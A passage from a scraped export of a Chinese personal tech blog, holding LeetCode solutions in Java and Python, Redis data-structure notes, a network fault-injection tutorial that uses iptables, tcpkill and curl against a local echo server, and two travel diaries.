max)); int size = curState.size(); List&lt;String&gt; newState = (max - row == 1) ? new ArrayList&lt;String&gt;() &#123;&#123; addAll(curState); &#125;&#125; : curState; // 递归层 dfs(max, row + 1, newState, resp, cols, pie, na); cols.remove(col); pie.remove(row + col); na.remove(row - col); curState.remove(size - 1); &#125; &#125; public String trans(int point, int max) &#123; char[] chars = new char[max]; for (int i = 0; i &lt; max; i++) &#123; chars[i] = i == point ? &#x27;Q&#x27; : &#x27;.&#x27;; &#125; return String.valueOf(chars); &#125;&#125; 69. x 的平方根实现 int sqrt(int x) 函数。 计算并返回 x 的平方根，其中 x 是非负整数。 由于返回类型是整数，结果只保留整数的部分，小数部分将被舍去。 示例 1: 12输入: 4输出: 2 示例 2: 1234输入: 8输出: 2说明: 8 的平方根是 2.82842..., 由于返回类型是整数，小数部分将被舍去。 思路二分查找比较 需要注意的地方有两个 注意开始边界问题 注意类型长度越界 解答1234567891011121314151617181920212223242526272829303132333435public class MySqrt &#123; public static void main(String[] args) &#123; MySqrt mySqrt = new MySqrt(); System.out.println(mySqrt.mySqrt(2147395599)); &#125; // 边界问题 // 1. 0\\1边界 // 类型长度越界 public int mySqrt(int x) &#123; if (x == 0) return 0; if (x == 1) return 1; return mySqrt(x, 0, x); &#125; public int mySqrt(long x, long left, long right) &#123; long cur = (right - left) / 2 + left; long cur2 = cur * cur; if (cur2 == x) &#123; return (int) cur; &#125; else if (right - left == 1) &#123; return (int) left; &#125; if (cur2 &lt; x) &#123; left = cur; &#125; else if (cur2 &gt; x) &#123; right = cur; &#125; else &#123; return (int) cur; &#125; return mySqrt(x, left, right); &#125;&#125; 扩展牛顿迭代法 98. 验证二叉搜索树题目给定一个二叉树，判断其是否是一个有效的二叉搜索树。 假设一个二叉搜索树具有如下特征： 节点的左子树只包含小于当前节点的数。节点的右子树只包含大于当前节点的数。所有左子树和右子树自身必须也是二叉搜索树。示例 1: 输入: 123 2 / \\1 3 输出: true示例 2: 输入: 12345 5 / \\1 4 / \\ 3 6 输出: false解释: 输入为: [5,1,4,null,null,3,6]。 根节点的值为 5 ，但是其右子节点值为 4 。 思路首先拿到这个题看起来思路比较简单，实现起来还有有点困难，而且在思考过程中踩过一个坑，又爬上来的。哎，看题还是要全面点。 首先想到就是中序遍历了，放到一个列表中，然后比较大小即可。 或者是做一个递归操作，判断当前节点是否在一个范围即可。 思路是这么两个思路，代码实现起来为了执行效率做了短路处理，就是边遍历边检查，遇到错误就一路返回不再进行后面处理，当然这是思路理顺后的优化。 中序遍历没坑，直接写就行了，有坑的是第二种操作，刚开始觉得只要比较当前节点的父节点和两个子节点就好了，就像下面画的，已 C 点为当前节点进行处理，实际是一个错误的思路，并且情况也分析的不对。 意识到问题后就重新分析，把当前节点作为最底端的节点，我们去比较的都是当前节点和父辈及以上的节点的大小，也就是拆出来四种情况。 其中 ⨁ 表示当前节点，和其它点的相对位置表示左右子节点关系，min -&gt; max 指向当前节点值必须在此区间中才可以，+∞ 和 -∞ 为单点情况的边界表示。最后拆分出这四种子情况，只要任一节点符合这四种情况之一即当前节点满足，当所有节点均满足则二叉搜索🌲有效，事实根据这个思路写出的代码验证是可行的。比较开心的是重新思考后的思路写出来的代码一次通过✌️。 代码解法1 12345678910111213141516171819202122232425262728293031323334353637/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public boolean isValidBST(TreeNode root)&#123; return forEachNode(root, new ArrayList&lt;&gt;()); &#125; public boolean forEachNode(TreeNode node, List&lt;Integer&gt; val)&#123; if (null == node) &#123; return true; &#125; if (!forEachNode(node.left, val))&#123; return false; &#125; if (!validOrAdd(val, node))&#123; return false; &#125; if (!forEachNode(node.right, val))&#123; return false; &#125; return true; &#125; public boolean validOrAdd(List&lt;Integer&gt; val, TreeNode node)&#123; if(val.size() &gt; 0 &amp;&amp; val.get(val.size() - 1) &gt;= node.val)&#123; return false; &#125;else&#123; return val.add(node.val); &#125; &#125;&#125; 解法2 123456789101112131415161718192021222324252627282930313233343536/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public boolean isValidBST(TreeNode root)&#123; return subValidBSTLeft(root, null, null); &#125; public boolean subValidBSTLeft(TreeNode node, Integer min, Integer max) &#123; if (null == node)&#123; return true; &#125; if (null == min &amp;&amp; null == max)&#123; &#125;else if (null == min &amp;&amp; null !=max &amp;&amp; node.val &lt; max)&#123; &#125;else if (null != min &amp;&amp; null == max &amp;&amp; min &lt; node.val)&#123; &#125;else if (null != min &amp;&amp; null != max &amp;&amp; min &lt; node.val &amp;&amp; node.val &lt; max)&#123; &#125;else &#123; return false; &#125; // left if (!subValidBSTLeft(node.left, min, node.val))&#123; return false; &#125; // right if (!subValidBSTLeft(node.right, node.val, max))&#123; return false; &#125; return true; &#125;&#125; 102. 二叉树的层次遍历问题给定一个二叉树，返回其按层次遍历的节点值。 （即逐层地，从左到右访问所有节点）。 例如:给定二叉树: [3,9,20,null,null,15,7], 12345 3 / \\9 20 / \\ 15 7 返回其层次遍历结果： 12345[ [3], [9,20], [15,7]] 解答123456789101112131415161718class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123; List&lt;List&lt;Integer&gt;&gt; resp = new ArrayList&lt;&gt;(); levelOrder(root, 0, resp); return resp; &#125; public void levelOrder(TreeNode cur, int cur_level, List&lt;List&lt;Integer&gt;&gt; resp) &#123; if(null == cur)&#123; return; &#125; if(cur_level == resp.size())&#123; resp.add(new ArrayList&lt;&gt;()); &#125; resp.get(cur_level).add(cur.val); levelOrder(cur.left, cur_level+1, resp); levelOrder(cur.right, cur_level+1, resp); &#125;&#125; 一次过 104. 二叉树的最大深度问题给定一个二叉树，找出其最大深度。 二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。 说明: 叶子节点是指没有子节点的节点。 示例：给定二叉树 [3,9,20,null,null,15,7]， 12345 3 / \\9 20 / \\ 15 7 返回它的最大深度 3 。 解答1234567891011class Solution &#123; public int maxDepth(TreeNode root) &#123; return maxDepth(root, 0); &#125; public int maxDepth(TreeNode cur, int level) &#123; if(null == cur) return level; int left_level = maxDepth(cur.left, level + 1); int right_level = maxDepth(cur.right, level + 1); return left_level &gt; right_level ? left_level: right_level; &#125;&#125; 一次过 111. 二叉树的最小深度题目给定一个二叉树，找出其最小深度。 最小深度是从根节点到最近叶子节点的最短路径上的节点数量。 说明: 叶子节点是指没有子节点的节点。 示例: 给定二叉树 [3,9,20,null,null,15,7], 12345 3 / \\9 20 / \\ 15 7 返回它的最小深度 2. 解答1234567891011121314151617181920class Solution &#123; public int minDepth(TreeNode root) &#123; return minDepth(root, 0); &#125; public int minDepth(TreeNode cur, int level) &#123; if (null == cur) return level; if (null == cur.left &amp;&amp; null == cur.right) &#123; return level + 1; &#125; else if (null != cur.left &amp;&amp; null == cur.right) &#123; return minDepth(cur.left, level + 1); &#125; else if (null == cur.left &amp;&amp; null != cur.right) &#123; return minDepth(cur.right, level + 1); &#125; else &#123; int left_level = minDepth(cur.left, level + 1); int right_level = minDepth(cur.right, level + 1); return left_level &gt; right_level ? right_level : left_level; &#125; &#125;&#125; 141. 环形链表给定一个链表，判断链表中是否有环。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。 正常的解题思路，通过记录走过的节点来判断是否有环。 时间复杂度：O(n)，对于含有 n 个元素的链表，我们访问每个元素最多一次。添加一个结点到哈希表中只需要花费 O(1) 的时间。 空间复杂度：O(n)，空间取决于添加到哈希表中的元素数目，最多可以添加 n 个元素。 1234567891011121314151617181920212223242526/** * Definition for singly-linked list. * class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; * val = x; * next = null; * &#125; * &#125; */public class Solution &#123; public boolean hasCycle(ListNode head) &#123; HashSet&lt;Integer&gt; points = new HashSet&lt;Integer&gt;(); ListNode cur = head; while (null != cur)&#123; int curHashCode = cur.hashCode(); if(points.contains(curHashCode))&#123; return true; &#125; points.add(curHashCode); cur = cur.next; &#125; return false; &#125;&#125; 第二种解题思路是双指针大小步，一个指针每次走一步，另一个指针每次走两步，如果有环的话则两个指针最终会相遇。 在最糟糕的情形下，时间复杂度为 O(N+K)，也就是 O(n)。 空间复杂度：O(1)，我们只使用了慢指针和快指针两个结点，所以空间复杂度为 O(1)。 123456789101112131415161718192021222324252627282930313233343536373839/** * Definition for singly-linked list. * class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; * val = x; * next = null; * &#125; * &#125; */public class Solution &#123; public boolean hasCycle(ListNode head) &#123; if (null == head)&#123; return false; &#125;else if (null == head.next)&#123; return false; &#125;else if (head == head.next.next)&#123; return true; &#125; ListNode minCur = head.next; ListNode maxCur = head.next.next; while (minCur != maxCur)&#123; if (null == minCur.next)&#123; return false; &#125;else if (null == maxCur.next)&#123; return false; &#125;else if (null == maxCur.next.next)&#123; return false; &#125; minCur = minCur.next; maxCur = maxCur.next.next; if (minCur == maxCur)&#123; return true; &#125; &#125; return false; &#125;&#125; 146. LRU缓存运用你所掌握的数据结构，设计和实现一个 LRU (最近最少使用) 缓存机制。它应该支持以下操作： 获取数据 get 和 写入数据 put 。 获取数据 get(key) - 如果密钥 (key) 存在于缓存中，则获取密钥的值（总是正数），否则返回 -1。写入数据 put(key, value) - 如果密钥不存在，则写入其数据值。当缓存容量达到上限时，它应该在写入新数据之前删除最近最少使用的数据值，从而为新的数据值留出空间。 链接：https://leetcode-cn.com/problems/lru-cache 1234567891011121314151617181920212223242526272829303132333435363738394041from collections import OrderedDictclass LRUCache(object): def __init__(self, capacity): &quot;&quot;&quot; :type capacity: int &quot;&quot;&quot; self._cache = OrderedDict() self._size = capacity def get(self, key): &quot;&quot;&quot; :type key: int :rtype: int &quot;&quot;&quot; if key not in self._cache: return -1 val = self._cache.pop(key) self._cache[key] = val return val def put(self, key, value): &quot;&quot;&quot; :type key: int :type value: int :rtype: None &quot;&quot;&quot; if key in self._cache: self._cache.pop(key) self._cache[key] = value else: if len(self._cache) == self._size: self._cache.popitem(last=False) self._cache[key] = value# Your LRUCache object will be instantiated and called as such:# obj = LRUCache(capacity)# param_1 = obj.get(key)# obj.put(key,value) 有序字典的解法时间复杂度 O(1)空间复杂度 O(capacity) Java 解法需要 LinkedHashMap TODO LRU(Least Recently Used)最少最近使用，一种页面置换算法。 LFU(Least Frequently Used)最近最不常用。 其它LRU 206. 反转链表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104public class ReverseLinkedList &#123; public static void main(String[] args) &#123; ListNode listNode = ListNode.of( 1, ListNode.of( 2, ListNode.of( 3, ListNode.of( 4, ListNode.of( 5, null ) ) ) ) ); ListNode next = listNode; while (null != next) &#123; System.out.println(next.val); next = next.next; &#125; System.out.println(&quot;===&quot;); ListNode reverse = reverse3(listNode); ListNode next2 = reverse; while (null != next2) &#123; System.out.println(next2.val); next2 = next2.next; &#125; &#125; /** * 官方推荐的 * @param head * @return */ public static ListNode reverse2(ListNode head) &#123; // prev -&gt; curr -&gt; nextTemp ListNode prev = null; ListNode curr = head; while (curr != null) &#123; ListNode nextTemp = curr.next; curr.next = prev; prev = curr; curr = nextTemp; &#125; return prev; &#125; /** * 自己写的 * @param head * @return */ public static ListNode reverse(ListNode head) &#123; // cur -&gt; prev -&gt; tmp ListNode cur = head; ListNode next = head.next; head.next = null; while (null != cur) &#123; ListNode tmp = null; if (null != next) &#123; tmp = next.next; next.next = cur; &#125; if (null == next) &#123; break; &#125; cur = next; next = tmp; &#125; return cur; &#125; /** * 复写的 * 1. 记录前一个节点，当前节点 * 2. 迭代 * 3. 取出当前节点到临时变量 * 4. -- 现在有 prev -&gt; curr -&gt; next 三个节点 * 5. 将 curr.next -&gt; prev，改变指向方向 * 6. 依次挪动节点位置 prev = curr , curr = nextTemp * 7. 最后返回 prev * * 时间复杂度 O(n) * 空间复杂度 O(1) * @param head * @return */ public static ListNode reverse3(ListNode head) &#123; // prev -&gt; curr -&gt; next ListNode prev = null; ListNode curr = head; while (null != curr) &#123; ListNode next = curr.next; curr.next = prev; prev = curr; curr = next; &#125; return prev; &#125;&#125; 208. 实现 Trie (前缀树)题目实现一个 Trie (前缀树)，包含 insert, search, 和 startsWith 这三个操作。 示例: Trie trie &#x3D; new Trie(); trie.insert(“apple”);trie.search(“apple”); &#x2F;&#x2F; 返回 truetrie.search(“app”); &#x2F;&#x2F; 返回 falsetrie.startsWith(“app”); &#x2F;&#x2F; 返回 truetrie.insert(“app”);trie.search(“app”); &#x2F;&#x2F; 返回 true说明: 你可以假设所有的输入都是由小写字母 a-z 构成的。保证所有输入均为非空字符串。 分析前缀树Trie字典树 解答123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869public class Trie &#123; private final int SIZE = 26; private Node root; private class Node &#123; private boolean isStr; private int num; private Node[] child; public Node() &#123; child = new Node[SIZE]; isStr = false; num = 1; &#125; &#125; public Trie() &#123; root = new Node(); &#125; public void insert(String word) &#123; if (null == word || word.isEmpty()) &#123; return; &#125; Node pNode = this.root; for (int i = 0; i &lt; word.length(); i++) &#123; int index = word.charAt(i) - &#x27;a&#x27;; if (pNode.child[index] == null) &#123; Node tmp = new Node(); pNode.child[index] = tmp; &#125; else &#123; pNode.child[index].num++; &#125; pNode = pNode.child[index]; &#125; pNode.isStr = true; &#125; public boolean search(String word) &#123; if (null == word || word.isEmpty()) &#123; return false; &#125; Node pNode = this.root; for (int i = 0; i &lt; word.length(); i++) &#123; int index = word.charAt(i) - &#x27;a&#x27;; if (pNode.child[index] == null || (word.length() - i == 1 &amp;&amp; pNode.child[index].isStr == false)) &#123; return false; &#125; pNode = pNode.child[index]; &#125; return true; &#125; public boolean startsWith(String prefix) &#123; if (null == prefix || prefix.isEmpty()) &#123; return false; &#125; Node pNode = this.root; for (int i = 0; i &lt; prefix.length(); i++) &#123; int index = prefix.charAt(i) - &#x27;a&#x27;; if (pNode.child[index] == null) &#123; return false; &#125; pNode = pNode.child[index]; &#125; return true; &#125;&#125; 703. 数据流中的第K大元素设计一个找到数据流中第K大元素的类（class）。注意是排序后的第K大元素，不是第K个不同的元素。 你的 KthLargest 类需要一个同时接收整数 k 和整数数组nums 的构造器，它包含数据流中的初始元素。每次调用 KthLargest.add，返回当前数据流中第K大的元素。 123456789101112131415161718192021222324import java.util.PriorityQueue;public class KthLargest &#123; private PriorityQueue&lt;Integer&gt; minHeap; private int kSize; public KthLargest(int k, int[] nums) &#123; kSize = k; minHeap=new PriorityQueue&lt;Integer&gt;(kSize); for (int i = 0; i&lt; nums.length; i++)&#123; add(nums[i]); &#125; &#125; public int add(int val) &#123; if (minHeap.size() &lt; kSize)&#123; minHeap.offer(val); &#125;else if (minHeap.peek() &lt; val)&#123; minHeap.poll(); minHeap.offer(val); &#125; return minHeap.peek(); &#125;&#125; Java中PriorityQueue通过二叉小顶堆实现，可以用一棵完全二叉树表示。 关于堆操作：https://shmilyaw-hotmail-com.iteye.com/blog/1775868 操作说明： 方法名功能描述 add(Ee)在队列头部增加一个元素，如果容量已满，则抛出异常，成功则返回true。 clear()清空 contains(Objecto)检查是否包含当前参数元素 offer(Ee)在队列头部增加一个元素，如果容量已满，则返回false，成功加入，返回true。 peek()返回队列头部节点，但不移除队列头节点。 poll()将队列头部元素移出队列并返回。 remove(Objecto)将队列头部元素移出队列并返回，如果队列为空，则抛出异常。 size()返回长度","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://noogel.xyz/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://noogel.xyz/tags/%E7%AE%97%E6%B3%95/"},{"name":"数据结构","slug":"数据结构","permalink":"https://noogel.xyz/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"第一次露营","slug":"关于生活/寻人不遇/第一次露营","date":"2019-07-29T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2019/07/29/1.html","link":"","permalink":"https://noogel.xyz/2019/07/29/1.html","excerpt":"","text":"发现自己没玩过的事情好多，上周末便实施了一次露营⛺️之路，叫上小伙伴一起报了个户外团，第一次去选择的比较休闲级别的，然后自带了几十斤装备在山上扎营看天。 去之前连帐篷都没有打开过，不过好在很好弄，去到了迅速选择好营地很快就扎好了。然后在山顶四处转了转。第一次出来玩还是挺兴奋的，但没多久就冻得回帐篷换上了衣服，对比去的时候早上北京的天气超级闷热。 周围也有好多同行的人在扎营，还有两只🐶子互相溜着玩，和它们的主人一样的兴奋。 到了傍晚，就开始下起了大雾，一直持续到了第二天早上，后来想想从山脚下看来这应该是☁️吧，那就是身在云中了。在这么个野外环境下，找厕所也是很方了，哈哈哈。 下了这么一晚上的雾，有点遗憾的是没能看到星空🌃，而且没能选到一个防露水的帐篷晚上被滴醒好几次😶。。。 早上还是挺可以的，看到了日出🌅和云海，还有四处觅食的🐂。其实云海肉眼看上去不太明显，但是做成一个加速的短视频就很好看了。 露营前简单做的攻略 说明： 加粗为必备 标 A 的说明已准备好 装备： 帐篷A、防潮垫A、睡袋A、气垫（防咯）、头灯A、手电A、登山包A、充电宝A、手机 雨衣A、雨鞋套A、登山鞋或运动鞋、长袖防风衣物、羽绒服、头巾、棉帽 暖贴A、水杯、水5L A、湿巾A、纸巾A、洗漱用品、垃圾袋A、耳塞（风声吵）、眼罩 自发热小火锅A、八宝粥、面包、筷子、红牛、便携气炉 药物（快客、思密达+ 、藿香正气、创可贴、防虫喷雾、布洛芬）、风油精 AAAAA 银行卡一张A、工具刀A、备用手机A 这里说一些注意点 帐篷一定要四季防雨防露水的，赶上下雨就惨了 防潮垫一定要有，并且根据情况准备厚点的防咯 暖贴可以准备一些晚上睡觉冷贴身上 垃圾袋还是多带点将垃圾带走 工具刀准备一下防止意外保护安全 如果带气炉的话要注意地铁不让进 吃的尽量带一些高热量食物，自发热小火锅我觉得必备 最后附上一张小朋友拍的很棒的照片。","categories":[],"tags":[{"name":"游记","slug":"游记","permalink":"https://noogel.xyz/tags/%E6%B8%B8%E8%AE%B0/"}]},{"title":"Redis 数据结构","slug":"关于技术/中间件/Redis数据结构","date":"2019-07-25T00:00:00.000Z","updated":"2025-07-23T07:30:58.914Z","comments":true,"path":"2019/07/25/1.html","link":"","permalink":"https://noogel.xyz/2019/07/25/1.html","excerpt":"","text":"跳表（Skip List）怎样理解跳表 用一种比较通俗的方式去说，跳表是一种带有 N 级索引的有序链表，其中 N 级索引的作用是可以加速查找到链表的目标节点。 比较大众化的解释是，跳表是一个随机化的数据结构，实质就是一种可以进行『二分』查找的有序链表。这里对于随机化的理解是 N 级索引节点的选择上。 跳表不仅能提高搜索性能，同时也可以提高插入和删除操作的性能。在一定程度上可以代替红黑树（Red-black tree）。 跳表的结构 从链表说起，对于普通链表中，即使其存储的数据是有序的，当我们要寻找一个数据，时间复杂度也会比较高 O(n)。 然后我们对链表建立一级索引，每两个节点提取一个节点放到索引层，其中的 down 指针指向下一级。 当我们寻找节点 16，只需要走过 1&#39; -&gt; 4&#39; -&gt; 7&#39; -&gt; 9&#39; -&gt; 13&#39; -&gt; 13 -&gt; 16 节点即可（17&#39;也要访问判断），而原始链表需要走过 10 个节点，节省了 2 个节点路径。如果我们再抽出二级索引后是这样子的。 寻找节点 16 只需要走过 1&#39;&#39; -&gt; 7&#39;&#39; -&gt; 13&#39;&#39; -&gt; 13&#39; -&gt; 13 -&gt; 16 节点。这样我们又可以加快查找到目标节点，图中举例节点比较靠前，试想节点靠后，并且增加了 N 级索引之后效率一定会提升很多。 跳表的性能指标单一链表的查询时间复杂度是 O(n)，插入、删除的时间复杂度也是 O(n)。 以两个节点为跨度的话，那么跳表有如下总结： 第 k 级索引的节点个数是 n/(2^k) 假设有 h 级索引，最高级索引有 2 个节点，高度 h=log2n - 1 (2为底数)，每一层都遍历 m 个节点，时间复杂度为 O(m*log n)。此时算得 m&#x3D;3。 以多个节点为跨度，可以节省更多节点，是空间和时间上的相互折中。在实际开发中，索引节点只存储关键值和关键指针，之后链表节点才存储实际对象。 跳表的的查询、插入、更新、删除时间复杂度均为 O(log n)。 如何选择索引层？通过一个随机函数决定将节点插入到哪几级索引中，随机函数特点是要保证跳表索引大小和数据大小平衡性。 跳表在 Redis 中的应用Redis 中有序集合通过散列表 + 跳表实现的，主要支持的功能有： 插入一个数据; 删除一个数据; 查找一个数据; 按照区间查找数据; 迭代输出有序序列; 相比红黑树，跳表在区间查找上有更好的性能；并且实现起来也相对容易；可以通过调整索引策略来平衡性能和内存使用；红黑树插入删除时为了平衡高度需要旋转附近节点，高并发时需要锁，跳表不需要考虑。 关于源码分析：https://segmentfault.com/a/1190000013418471 参考 https://www.jianshu.com/p/dd01e8dc4d1fhttps://blog.csdn.net/pcwl1206/article/details/83512600 整数集合在一个集合中只有为数不多的整数时，Redis 使用 intset 整数集合存储数据。具有如下特性： 12345678typedef struct intset &#123; //编码方式 uint32_t encoding; //元素数目 uint32_t length; //保存元素的数组 int8_t contents[];&#125; intset; 数据从小到大排序并且自动去重。 数据类型实际存储在 encoding 中。 当 encoding 中的数据类型不能满足时会自动进行类型升级。 重新分配空间 迁移 添加新元素 时间复杂度为 O(n) 不支持降级操作。 优点： 灵活，不用考虑整数集合类型，直接添加自动升级。 节省空间，只在必要时进行升级。 升级操作是指将整数由 16 位、32 位、64 位的方式增加支持范围。 IO 模型通俗的理解 Redis 是一个单进程单线程模型的 KV 内存数据库，截止到目前官方会在年底发布多线程版本，并且 Redis 也有自己的持久化方案。采用 I&#x2F;O 复用模型和非阻塞 IO 技术，被广泛应用在高并发场景中。 Redis 高性能的几个关键点： 完全基于内存操作，数据也是存储在内存中。 数据结构简单，很多查找和操作的时间复杂度在 O(1)。 单线程模式，避免了上下文的切换和锁竞争。 使用了 I&#x2F;O 多路复用模型和非阻塞 IO。 Redis 同时支持多个客户端连接，采用 I&#x2F;O 多路复用模型（select\\poll\\epoll）可以同时监听多个 IO 流事件。 多路指的是多个网络连接，复用指的是复用同一个线程。采用多路IO复用技术可以让单个线程高效的处理多个连接请求(尽量减少网络IO的时间消耗)，且Redis在内存中操作数据的速度非常快(内存内的操作不会成为这里的性能瓶颈)，主要以上两点造就了Redis具有很高的吞吐量。 TODO I&#x2F;O 多路复用 参考 http://researchlab.github.io/2018/10/08/redis-11-redisio/","categories":[],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://noogel.xyz/tags/Redis/"}]},{"title":"网络异常测试","slug":"关于技术/系统经验/网络异常测试","date":"2019-07-14T00:00:00.000Z","updated":"2025-07-23T07:30:58.917Z","comments":true,"path":"2019/07/14/1.html","link":"","permalink":"https://noogel.xyz/2019/07/14/1.html","excerpt":"","text":"在这几年的微服务开发过程中遇到过两次因为网络问题导致的系统故障，并且没有做好降级策略，导致系统的不可用时间增加，所以今天专门整理一篇关于网络故障的问题分析处理以及开发中需要注意的地方。 基础部分TCP 连接，先抛大图： 主要分为三部分： 建立连接 传输数据 关闭连接 原理不做过多介绍，主要说说常见的异常和模拟方式。 常见的异常类型上面的异常是一些常见的功能性异常，其它性能方面的异常不在本文讨论范围。 实施手段需要的工具 python 脚本 iptables，对网络流量进行规则过滤 tcpkill，用来断开网络构造异常 curl，发起 http 访问请求 Python脚本主要作用是启动一个TCP监听，然后将接收到的数据在转发回去。 1234567891011121314151617181920212223#! /usr/bin/python# -*- coding:utf-8 -*-import socketimport sysdef start_tcp_server(ip, port): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_address = (ip, port) print(&#x27;Starting listen on ip %s, port %s&#x27; % server_address) sock.bind(server_address) try: sock.listen(1) except socket.error as exc: print(&#x27;Fail to listen on port %s&#x27; % exc) return while True: print(&quot;Waiting for connection&quot;) client, addr = sock.accept() data = client.recv(1000) client.send(data) client.close() print(data)if __name__ == &#x27;__main__&#x27;: start_tcp_server(&#x27;0.0.0.0&#x27;, 12345) iptables 基本使用123456// 查看当前生效规则iptables -L -n// 清空所有规则iptables --flushiptables -F tcpkill 基本使用https://yq.aliyun.com/articles/59308 1234// 安装sudo apt-get install dsniff// 使用... curl 超时设置使用 curl 有两个超时时间，一个是连接超时时间，另一个是数据传输的最大允许时间。连接超时时间用 --connect-timeout 参数来指定，数据传输的最大允许时间用 -m 参数来指定。 1curl --connect-timeout 10 -m 20 &quot;http://192.168.1.110:12345&quot; 实施过程 A机器启动Python脚本，监听12345端口。 B级器通过curl命令进行访问。 在访问过程中通过配置iptables来实现网络的各种异常情况。 通过 tcpkill 来实现连接中断的异常情况。 正常访问123456xyz@xyz-pc:~$ curl &quot;http://192.168.1.110:12345&quot;GET / HTTP/1.1Host: 192.168.1.110:12345User-Agent: curl/7.58.0Accept: */* 查看和清除规则12345678910111213xyz@xyz-pc:~$ sudo iptables -L -n[sudo] xyz 的密码： Chain INPUT (policy ACCEPT)target prot opt source destination Chain FORWARD (policy ACCEPT)target prot opt source destination Chain OUTPUT (policy ACCEPT)target prot opt source destination DROP tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:12345 flags:0x17/0x02xyz@xyz-pc:~$ sudo iptables -F 连接超时123xyz@xyz-pc:~$ sudo iptables -A OUTPUT -p tcp --syn --dport 12345 -j DROPxyz@xyz-pc:~$ curl --connect-timeout 10 &quot;http://192.168.1.110:12345&quot;curl: (28) Connection timed out after 10001 milliseconds 读取数据超时123xyz@xyz-pc:~$ sudo iptables -A OUTPUT -p tcp -m state --state ESTABLISHED --dport 12345 -j DROPxyz@xyz-pc:~$ curl --connect-timeout 10 -m 20 &quot;http://192.168.1.110:12345&quot;curl: (28) Operation timed out after 20001 milliseconds with 0 bytes received 拒绝连接123xyz@xyz-pc:~$ sudo iptables -A OUTPUT -p tcp --dport 12345 -j REJECTxyz@xyz-pc:~$ curl --connect-timeout 10 -m 20 &quot;http://192.168.1.110:12345&quot;curl: (7) Failed to connect to 192.168.1.110 port 12345: 拒绝连接 连接被重置这里需要将Python脚本的 client.close() 注释掉。 1234567xyz@xyz-pc:~$ sudo tcpkill -iwlp8s0 port 12345xyz@xyz-pc:~$ curl --connect-timeout 10 &quot;http://192.168.1.110:12345&quot;GET / HTTP/1.1Host: 192.168.1.110:12345User-Agent: curl/7.58.0Accept: */*curl: (56) Recv failure: 连接被对方重设 总结在越来越多的企业微服务化进程中，肯定会遇到网络请求的各种问题，当我们在做一个基础组件或者进行网络通信请求时需要考虑到这些异常情况，最好还是将各种常见的情况模拟实施一下，来保证服务的稳定性。首先要说的是请求的超时设置，不论是在进行 HTTP 访问还是封装后的 RPC 请求，超时设置是最基本的。基于不同语言的不同组件实现质量来说。曾经遇到过一个问题是，一个服务处于假死状态，Java 的客户端中默认超时和多线程可以使主线程服务不会受到过多影响，golang 中的客户端默认设置了一个很长的超时时间，服务在一定程度上受到了影响，而Python的客户端超时时间也是很长，还有就是Python只有一个主线程再跑，所以此时服务会被 hang 住了。所以这里还有一个问题就是服务降级，当前服务如果出现问题，重试几次后仍然失败，那么是否降级来保证当前服务的可用性，其实考虑的是异常服务对于当下的重要性，是否在整个核心服务链路当中，否则的话进行降级处理。还有一个关键点是慎用重试，偶然的网络波动导致的异常在重试下会很有效，但是当遇到服务性能导致的超时问题时，就遇到大量的客户端重试导致请求翻倍，很可能会直接把服务打挂，所以不要轻易使用重试，可以通过一些额外的补偿机制来提高服务稳定性。 ad.未防止爬虫盗爬我的文章，在末尾打个广告。这篇文章首发在我的个人博客 知一的指纹 http://noogel.xyz ，有需要技术交流的朋友可以加我个人微信：zhi2012666 参考 https://blog.csdn.net/llianlianpay/article/details/79768890https://www.cnblogs.com/gl1573/p/10129382.htmlhttps://blog.csdn.net/wangyiyungw/article/details/85004905","categories":[],"tags":[{"name":"网络","slug":"网络","permalink":"https://noogel.xyz/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"坝上草原","slug":"关于生活/寻人不遇/坝上草原","date":"2019-07-09T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2019/07/09/1.html","link":"","permalink":"https://noogel.xyz/2019/07/09/1.html","excerpt":"","text":"从北京出发一路向北有个坝上草原，趁着七月天热的时候去避避暑，看惯了城市的生活，周末偶尔出去放松一下也是好的。便约了几个同事一起自驾过去玩的。 去的前一天预报说下雨☔️，结果当天也只是一路阴天☁️，等到了坝上草原也没有下，恰巧那天晚上北京下的，完美避过。下面这张是在去的时候怀柔拍的，这边的山⛰相对高耸一点，夏天还有点绿色，冬天就真的是凸凸的。 等到了坝上草原这边，真的是天高云阔空气清新。而且也有点冷🥶，哈哈哈也就二十度左右，所以带件外套真的是很有必要的。 在丰宁，一路上都是这样子的。 整个旅途并没有排的很紧凑，而是自驾的舒适随意。导航到了一个草原的入口，然后爬上山坡一路向草原深处走去。顺着一条小路走过一个又一个山丘，草原的广阔无垠尽收眼底。同时，七月的日子里草原也是超级冷的，小风飕飕的，所以准备穿着冲锋衣来是最明智的选择了。 在草原，远远望去会看到一个个的村庄，彼此离得很远感觉出村的路就那么一条，不过生活在这样的地方应该会很惬意。 要说印象最深的还是说草原的夕阳🌇了吧，在城市里因为高楼的遮挡可能早早的就见不到太阳了。而草原的夕阳可以在很晚，直到太阳落到地平线以下。拍下面这张图的时间是在傍晚 7 点半。草原的能见度真的很高，远处的山⛰感觉要几十公里外了。 来这样的环境下偶尔放松放松，心情真的也会很好了。还有一张像极了 Windows 经典的桌面背景，蓝天白云绿草地。 